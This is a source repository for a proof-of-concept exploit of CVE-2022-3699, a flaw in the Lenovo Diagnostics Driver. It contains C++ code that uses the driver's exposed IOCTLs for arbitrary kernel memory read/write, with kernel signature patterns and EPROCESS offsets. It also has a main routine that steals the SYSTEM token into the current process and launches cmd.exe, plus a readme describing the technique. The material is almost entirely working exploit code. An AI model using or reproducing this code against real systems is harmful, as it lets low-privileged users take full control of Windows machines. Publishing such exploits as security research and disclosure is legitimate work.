#define MAXSEARCH_KEBUGCHECKEX 0x300
#define MAXSEARCH_KEBUGCHECK2 0x1100
#define MAXSEARCH_KIMARKBUGCHECKREGIONS 0x200
#define MAXSEARCH_MMGETPHYS 0x200
#define MAXSEARCH_MIGETPHYS 0x200
#define MAXSEARCH_KIMARKBUGCHECKREGIONS 0x200

#define SZ_CALLREL32 5
#define SZ_MOV_REL32 7

static BYTE arrKeBugCheckExPattern[7] = { 0xe8, 0, 0, 0, 0, 0x90, 0xc3 };
static BYTE arrKeBugCheckExMask[7] = { 0, '?', '?', '?', '?', 0, 0 };

static BYTE arrKeBugCheck2Pattern[8] = { 0xe8, 0, 0, 0, 0, 0x48, 0x83, 0x3d };
static BYTE arrKeBugCheck2Mask[8] = { 0, '?', '?', '?', '?', 0, 0, 0 };

static BYTE arrMovRaxPteBasePattern[9] = { 0x48, 0x8b, 0x05, 0, 0, 0, 0, 0x48, 0xc1 };
static BYTE arrMovRaxPteBaseMask[9] = { 0, 0, 0, '?', '?', '?', '?', 0, 0 };

static BYTE arrMmGetPhysPattern[7] = { 0xe8, 0, 0, 0, 0, 0xf7, 0xd8 };
static BYTE arrMmGetPhysMask[7] = { 0, '?', '?', '?', '?', 0, 0 };

static BYTE arrCallMiFillPteHierarchy[8] = { 0xe8, 0, 0, 0, 0, 0x48, 0x8b, 0xce };
static BYTE arrCallMiFillPteHierarchyMask[8] = { 0,'?','?','?','?', 0, 0, 0 };

static BYTE arrMiGetPhysPattern[6] = { 0xe8, 0, 0, 0, 0, 0xeb };
static BYTE arrMiGetPhysMask[6] = { 0, '?', '?', '?', '?', 0 };

static BYTE arrMiVaToPfnPattern[12] = { 0x48, 0xbf, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x8b };
static BYTE arrMiVaToPfnMask[12] = { 0, 0, '?', '?', '?', '?','?', '?', '?', '?', 0, 0 };

static BYTE arrMiFillPteHeirarchyPTE[13] = {
	0x49, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, // mov r8, qwPteBase
	0x49, 0x8b, 0xc0 // mov rax, r8 
};
static BYTE arrMiFillPteHeirarchyPTEMask[13] = { 0, 0, '?', '?', '?', '?','?', '?', '?', '?', 0, 0, 0 };
// end pattern matching

#define OFFSET_EPROCESS_LINKS 0x448
#define OFFSET_EPROCESS_TOKEN 0x4b8
#define OFFSET_EPROCESS_PID 0x440


class LenovoMemoryMgr
{
public:
	LenovoMemoryMgr() {};
	~LenovoMemoryMgr() {};

	HANDLE hDevice = 0;
	UINT64 physSwapAddr = 0;
	UINT64 tempSwap = 0;
	UINT64 NtosBase = 0;
	UINT64 PteBase = 0;

	// untested, YMMV
	BOOL ReadVirtualMemory(_In_ UINT64 address, _Inout_ PVOID buffer, _In_ size_t szBuffer);
	
	// untested, YMMV
	BOOL WriteVirtualMemory(_In_ UINT64 address, _In_ PVOID buffer, _In_ size_t szBuffer);
	
	
	BOOL init();
	BOOL teardown();

	const char* strDeviceName = R"(\\.\LenovoDiagnosticsDriver)";
	
	template <typename T>
	BOOL ReadPhysData(_In_ UINT64 address, _Out_ T* data);

	template <typename T>
	BOOL WritePhysData(_In_ UINT64 PhysDest, _In_ T* data);

	template <typename T>
	BOOL ReadVirtData(_In_ UINT64 address, _Out_ T* data);

	template <typename T>
	BOOL WriteVirtData(_In_ UINT64 address, _Out_ T* data);

private:
	PFILL_PTE_HIERARCHY CreatePteHierarchy(UINT64 VirtualAddress);
	UINT64 FindPhysSwapSpace();
	UINT64 GetPteBase();
	UINT64 VtoP(UINT64 va, UINT64 index, PageType p);	
	BOOL SearchPattern(PBYTE patten, PBYTE mask, DWORD dwPatternSize, UINT64 lpBeginSearch, SIZE_T lenSearch, PUINT64 AddressOfPattern);
	PageType GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry);
	UINT64 FindNtosBase();
};


```

`CVE-2022-3699/Source.cpp`:

```cpp
/*
Copyright 2022 <COPYRIGHT HOLDER>

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include <Windows.h>
#include <stdio.h>
#include "LenovoMemoryMgr.h"

BOOL SearchEprocessLinksForPid(LenovoMemoryMgr lm, UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess) {
	BOOL bRes = FALSE;
	if (!lpTargetProcess) {
		return FALSE;
	}

	UINT64 ListIter = SystemEprocess + OFFSET_EPROCESS_LINKS;
	UINT64 ListHead = ListIter;
	while (TRUE) {
		bRes = lm.ReadVirtData((ListIter + 0x8), &ListIter);
		
		if (!bRes) {
			return FALSE;
		}

		if (ListIter == ListHead) {
			puts("Process not found in ActiveProcess links!");
			return FALSE;
		}

		UINT64 IterEprocessBase = ListIter - OFFSET_EPROCESS_LINKS;
		UINT64 IterPid = 0;

		bRes = lm.ReadVirtData((IterEprocessBase + OFFSET_EPROCESS_PID), &IterPid);
		if (!bRes) {
			return FALSE;
		}

		printf("Found EPROCESS : %llx - PID %llx\n", IterEprocessBase, IterPid);
		if (IterPid == Pid) {
			puts("Found target EPROCESS!");
			*lpTargetProcess = IterEprocessBase;
			return TRUE;
		}
	}
}

UINT64 GetPsInitialSystemProc(UINT64 lpNtoskrnlBase) {
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, "PsInitialSystemProcess");
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)lpNtoskrnlBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}


int main() {
	LenovoMemoryMgr lm = LenovoMemoryMgr::LenovoMemoryMgr();
	
	BOOL hasInit = lm.init();
	
	if (!hasInit) {
		return -1;
	}

	UINT64 OurProcess = 0;
	UINT64 PsInitialSystemProcPtr = GetPsInitialSystemProc(lm.NtosBase);
	printf("Found initial system process at %llx\n", PsInitialSystemProcPtr);
	UINT64 SystemProc = 0;
	lm.ReadVirtData(PsInitialSystemProcPtr, &SystemProc);
	SearchEprocessLinksForPid(lm, GetCurrentProcessId(), SystemProc, &OurProcess);
	UINT64 SystemToken = 0;
	lm.ReadVirtData(SystemProc + OFFSET_EPROCESS_TOKEN, &SystemToken);
	lm.WriteVirtData(OurProcess + OFFSET_EPROCESS_TOKEN, &SystemToken);
	lm.teardown();
	system("cmd.exe");
	return 0;
}

```

`readme.md`:

```md
## CVE-2022-3699

Incorrect access control for the Lenovo Diagnostics Driver allows a low-privileged user the ability to issue device IOCTLs to perform arbitrary physical/virtual memory read/write.

Thank you to ch3rn0byl for helping with this (and I totally 100% ripped two of his functions).

### Explanation

IOCTL 0x222000:

* rdmsr

IOCTL 0x222008/0x22200C:

* HalGet/SetBusData

IOCTL 0x222010:

* Read via MmMapIoSpace

IOCTL 0x222014:

* Write via MmMapIoSpace

* This IOCTL copies a value from a pointer supplied in the input buffer into mapped physical memory


### How it works:

In order to resolve MmPteBase and other prerequisites, a physical "swap" space is found by searching the physical memory range `0x1000 - 0x10000` for 8 zero bytes.

Once that space is found, virtual memory is copied into that swap space via IOCTL 0x222014 and read back using IOCTL 0x222010.

As it is now, ALL virtual reads are done using this "swap" space. 

Is it the best way to do virtual r/w? Probably not.

Does it work? Yes.

Oh, also, mind your own offsets -- this was tested on Windows 11 21H2 with HVCI disabled.
```